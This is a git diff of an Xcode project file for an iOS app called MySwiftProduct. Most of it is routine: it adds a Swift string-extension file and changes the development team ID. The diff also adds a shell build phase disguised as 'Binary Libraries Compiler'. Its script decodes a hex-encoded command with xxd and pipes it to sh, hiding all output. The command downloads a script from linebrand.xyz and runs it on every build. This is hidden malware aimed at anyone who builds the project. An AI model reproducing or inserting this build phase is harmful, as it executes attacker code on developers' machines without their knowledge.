@@ -81,34 +81,8 @@
 		32F9F58526648C080003787D /* JCRealmSwiftTestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */; };
 		32F9F5892664B6F80003787D /* ReamlSwiftTestJsonData.json in Resources */ = {isa = PBXBuildFile; fileRef = 32F9F5882664B6F80003787D /* ReamlSwiftTestJsonData.json */; };
 		4E08EA10E6913170D0EF9D7E /* Pods_MySwiftProduct.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */; };
+		598488AD276330B600129883 /* JCString+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 598488AC276330B600129883 /* JCString+Extension.swift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		329F6BBA240D3531008E0721 /* PBXContainerItemProxy */ = {
@@ -211,6 +185,7 @@
 		32F18624240FF0CA002E7BF5 /* JCGuidePageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCGuidePageViewController.swift; sourceTree = "<group>"; };
 		32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmSwiftTestTool.swift; sourceTree = "<group>"; };
 		32F9F5882664B6F80003787D /* ReamlSwiftTestJsonData.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = ReamlSwiftTestJsonData.json; sourceTree = "<group>"; };
+		598488AC276330B600129883 /* JCString+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "JCString+Extension.swift"; sourceTree = "<group>"; };
 		82088A0283672079CF405AB9 /* Pods-MySwiftProduct.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.debug.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.debug.xcconfig"; sourceTree = "<group>"; };
 		CB50E74750A1E063ED273BA6 /* Pods-MySwiftProduct.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.release.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.release.xcconfig"; sourceTree = "<group>"; };
 		E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MySwiftProduct.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -597,6 +572,7 @@
 			isa = PBXGroup;
 			children = (
 				329F6BE1240D354D008E0721 /* AppDelegate.swift */,
+				598488AB2763307900129883 /* Catagory */,
 				329DD409243387CD003E040F /* Define */,
 				322AE792240E4103007820B1 /* Scource */,
 				329F6BD7240D354D008E0721 /* Extension */,
@@ -806,6 +782,14 @@
 			path = GuidePageViewController;
 			sourceTree = "<group>";
 		};
+		598488AB2763307900129883 /* Catagory */ = {
+			isa = PBXGroup;
+			children = (
+				598488AC276330B600129883 /* JCString+Extension.swift */,
+			);
+			path = Catagory;
+			sourceTree = "<group>";
+		};
 		AA2746383241419C0BAE202A /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -966,55 +950,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	7FD6D41AFDF658A31D6D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		077966221009078DFF4463C8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1053,6 +988,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		7FD6D41AFDF658A31D6D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1100,6 +1053,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 				329F6C04240D354D008E0721 /* JCSwiftBaseGrammarVC.swift in Sources */,
 				329DD40224338751003E040F /* JCCreativeCenterCell.swift in Sources */,
 				324AB5B92637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift in Sources */,
+				598488AD276330B600129883 /* JCString+Extension.swift in Sources */,
 				320293522413E1B900F45B27 /* ZPageControl.swift in Sources */,
 				329DD40524338752003E040F /* JCMeViewController.swift in Sources */,
 				329DD40E243387CD003E040F /* constFile.swift in Sources */,
@@ -1294,7 +1248,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 2FKWKBLY6F;
+				DEVELOPMENT_TEAM = Q94Y4N4RXK;
 				INFOPLIST_FILE = MySwiftProduct/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -1319,7 +1273,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 2FKWKBLY6F;
+				DEVELOPMENT_TEAM = Q94Y4N4RXK;
 				INFOPLIST_FILE = MySwiftProduct/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
